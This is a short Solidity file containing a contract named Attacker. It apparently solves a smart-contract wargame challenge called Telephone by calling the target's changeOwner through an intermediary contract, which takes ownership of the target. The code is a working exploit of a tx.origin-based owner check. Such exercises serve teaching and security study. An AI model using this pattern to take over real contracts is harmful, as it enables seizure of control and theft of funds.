// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITelephone {
    function changeOwner(address _owner) external;
}
contract Attacker {

    function changeOwner(address owner, address target) public {
        ITelephone targetContract = ITelephone(target);
        targetContract.changeOwner(owner);
    }
}
